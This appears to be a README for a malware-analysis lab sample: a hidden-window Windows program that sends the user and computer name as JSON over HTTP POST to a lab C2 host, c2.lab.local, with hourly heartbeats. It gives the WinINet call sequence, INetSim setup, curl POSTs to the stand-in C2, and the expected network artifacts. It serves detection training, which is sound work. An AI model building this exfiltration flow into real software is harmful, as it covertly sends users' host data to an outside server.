# A04.4a HTTP JSON Data Exfiltration

## Summary

Collects basic host identity information, serializes the collected
data as JSON, and transmits it to a controlled laboratory server using
HTTP POST requests.

The sample demonstrates application-layer data exfiltration behavior
commonly associated with information stealers, spyware, remote-access
trojans, lightweight implants, and malware that sends collected host
information to command-and-control infrastructure.

The exfiltration workflow performs the following operations:

* Retrieves the current Windows user name
* Retrieves the local computer name
* Generates a local execution timestamp
* Constructs structured JSON payloads
* Resolves the laboratory C2 hostname
* Establishes an HTTP connection
* Sends data using HTTP POST requests
* Uses the `application/json` content type
* Creates a background worker thread
* Sends periodic host heartbeat messages
* Keeps the process active for continued transmission

The HTTP communication is implemented using the Windows WinINet API.

The primary transmission operation is performed using:

```text
HttpSendRequestA()
```

All network communication is directed to the controlled laboratory
hostname:

```text
c2.lab.local
```

No real external command-and-control server is contacted.

---

## Payload Summary

The payload behavior consists of collecting basic system identity
information and transmitting two types of JSON messages to a
laboratory HTTP server.

### Initial Login Information Message

Immediately after execution, the sample sends a JSON document
containing:

* Current user name
* Computer name
* Execution timestamp

The message is sent to:

```text
http://c2.lab.local/api/v1/report
```

### Periodic Location Heartbeat Message

After the initial transmission, the sample creates a background
worker thread that sends a heartbeat message once every hour.

The heartbeat contains:

* Current user name
* Computer name
* Static status value
* Current timestamp

The static status value is:

```text
location_heartbeat
```

The sample does not collect geographic coordinates. The location
message functions only as a controlled telemetry heartbeat.

No persistence, credential extraction, privilege escalation,
file encryption, or destructive functionality is performed.

---

## Network Configuration

### Destination Host

```text
c2.lab.local
```

### Destination Port

```text
80/TCP
```

### HTTP Method

```text
POST
```

### Request Path

```text
/api/v1/report
```

### Content Type

```text
application/json
```

### User-Agent

```text
DataPipelineAgent/1.0
```

---

## To Execute A04_4a

### Step 1 — Confirm laboratory name resolution

From the Windows analysis VM:

```powershell
Resolve-DnsName c2.lab.local
```

The hostname should resolve to the INetSim server:

```text
192.168.67.5
```

### Step 2 — Launch the HTTP exfiltration sample

```powershell
.\A04-Credential-Theft-Spyware-Keylogger\A04_4a\bin\A04_4a_HTTP_JSON_Exfil.exe
```

The sample does not require command-line arguments.

The console window is hidden during execution.

### Step 3 — Allow the initial HTTP POST to complete

The first JSON payload is transmitted immediately after the sample
retrieves the current user and computer names.

### Step 4 — Terminate the sample after artifact collection

The sample remains active to support hourly heartbeat transmission.

Terminate it manually after the required dynamic artifacts have been
captured.

For example:

```powershell
Stop-Process -Name A04_4a_HTTP_JSON_Exfil
```

---

## Expected Initial JSON Payload

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "login_time": "2026-07-30 13:45:12"
}
```

---

## Expected Heartbeat JSON Payload

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "status": "location_heartbeat",
  "time": "2026-07-30 14:45:12"
}
```

The exact values depend on the user account, host name, and execution
time of the Windows analysis system.

---

## Expected Dynamic Artifacts

### Process Activity

The sample creates:

* Main executable process
* Background worker thread

Relevant Windows API activity includes:

```text
CreateThread()
Sleep()
```

The main thread remains active using repeated 10-second sleep
intervals.

The worker thread sleeps for:

```text
3,600,000 milliseconds
```

This corresponds to one hour between heartbeat transmissions.

### DNS Activity

The sample attempts to resolve:

```text
c2.lab.local
```

Expected DNS behavior includes:

* DNS query for `c2.lab.local`
* DNS response containing `192.168.67.5`

### Network Activity

Expected network activity includes:

* Outbound TCP connection to `192.168.67.5:80`
* HTTP POST request to `/api/v1/report`
* `Content-Type: application/json`
* User-Agent value `DataPipelineAgent/1.0`
* JSON data in the HTTP request body

### Filesystem Activity

The sample does not create a local staging file.

The primary filesystem artifacts are generated on the INetSim server
when it stores captured HTTP POST data.

---

# High-Level HTTP JSON Exfiltration Flow

1. Start the data exfiltration executable

   ```text
   A04_4a_HTTP_JSON_Exfil.exe
   ```

2. Hide the console window using:

   ```text
   ShowWindow(SW_HIDE)
   ```

3. Retrieve the current user name using:

   ```text
   GetUserNameA()
   ```

4. Retrieve the local computer name using:

   ```text
   GetComputerNameA()
   ```

5. Generate a local timestamp using:

   ```text
   time()
   localtime_s()
   strftime()
   ```

6. Construct the initial JSON payload containing:

   * User name
   * Computer name
   * Login timestamp

7. Initialize a WinINet session using:

   ```text
   InternetOpenA()
   ```

8. Configure the WinINet user-agent as:

   ```text
   DataPipelineAgent/1.0
   ```

9. Establish an HTTP connection to:

   ```text
   c2.lab.local:80
   ```

   using:

   ```text
   InternetConnectA()
   ```

10. Create an HTTP POST request for:

    ```text
    /api/v1/report
    ```

    using:

    ```text
    HttpOpenRequestA()
    ```

11. Add the request header:

    ```text
    Content-Type: application/json
    ```

12. Transmit the JSON request body using:

    ```text
    HttpSendRequestA()
    ```

13. Close the HTTP request and connection handles using:

    ```text
    InternetCloseHandle()
    ```

14. Create a background worker thread using:

    ```text
    CreateThread()
    ```

15. Construct a heartbeat JSON payload containing:

    * User name
    * Computer name
    * `location_heartbeat` status
    * Current timestamp

16. Send the heartbeat payload to the same HTTP endpoint

17. Pause the worker thread for one hour using:

    ```text
    Sleep(3600000)
    ```

18. Repeat the heartbeat transmission indefinitely

19. Keep the main thread active using repeated calls to:

    ```text
    Sleep(10000)
    ```

20. Continue execution until the process is manually terminated

---

# INetSim Laboratory Configuration

## Step 1 — Configure INetSim Services

Edit the INetSim configuration file:

```bash
sudo nano /etc/inetsim/inetsim.conf
```

Configure the service bind address:

```text
service_bind_address 192.168.67.5
```

Enable DNS and HTTP services:

```text
start_service dns
start_service http
```

Configure the default DNS response:

```text
dns_default_ip 192.168.67.5
```

Add a static record for the controlled C2 hostname:

```text
dns_static c2.lab.local 192.168.67.5
```

---

## Step 2 — Configure the HTTP Response

Create a static JSON response file:

```bash
sudo nano /var/lib/inetsim/http/fakefiles/report_OK.json
```

Add the following response body:

```json
{
  "status": "ok",
  "task": "telemetry accepted"
}
```

Configure INetSim to serve the response for the sample endpoint:

```text
http_static_fakefile /api/v1/report report_OK.json application/json
```

Restart INetSim after making configuration changes:

```bash
sudo systemctl restart inetsim
```

Alternatively, when running INetSim manually:

```bash
sudo inetsim
```

---

## Step 3 — Test the HTTP Endpoint

From the Windows analysis VM, test the standard HTTP response:

```powershell
curl.exe http://c2.lab.local/api/v1/report
```

Expected response:

```json
{
  "status": "ok",
  "task": "telemetry accepted"
}
```

Test an HTTP POST request:

```powershell
curl.exe -X POST http://c2.lab.local/api/v1/report `
  -H "Content-Type: application/json" `
  -d "{\"test\":\"A04_4a\"}"
```

---

## Step 4 — Monitor INetSim Activity

Monitor the INetSim service log:

```bash
sudo tail -f /var/log/inetsim/service.log
```

Expected entries should indicate:

* DNS resolution for `c2.lab.local`
* HTTP connection from the Windows analysis VM
* HTTP POST request to `/api/v1/report`
* Captured POST request data

---

## Step 5 — View Captured POST Data

Display all captured HTTP POST request bodies:

```bash
sudo cat /var/lib/inetsim/http/postdata/*
```

The stored content should include the JSON transmitted by the sample.

Example:

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "login_time": "2026-07-30 13:45:12"
}
```

---

## Step 6 — Delete Previous POST Data

Before beginning a new controlled execution, remove old captured POST
data:

```bash
sudo find /var/lib/inetsim/http/postdata -type f -delete
```

This prevents artifacts from previous sample executions from being
mixed with the current analysis run.

---

# Expected INetSim and PCAP Evidence

## INetSim Service Log

The INetSim log should record:

```text
DNS request for c2.lab.local
HTTP connection to port 80
POST request for /api/v1/report
```

## Captured POST Data

INetSim should create one or more files under:

```text
/var/lib/inetsim/http/postdata/
```

These files should contain the transmitted JSON request bodies.

## Packet Capture

A corresponding packet capture should show:

1. DNS query for:

   ```text
   c2.lab.local
   ```

2. DNS response containing:

   ```text
   192.168.67.5
   ```

3. TCP three-way handshake with:

   ```text
   192.168.67.5:80
   ```

4. HTTP POST request to:

   ```text
   /api/v1/report
   ```

5. HTTP request header:

   ```text
   Content-Type: application/json
   ```

6. HTTP request body containing host identity data

7. HTTP response containing:

   ```json
   {
     "status": "ok",
     "task": "telemetry accepted"
   }
   ```



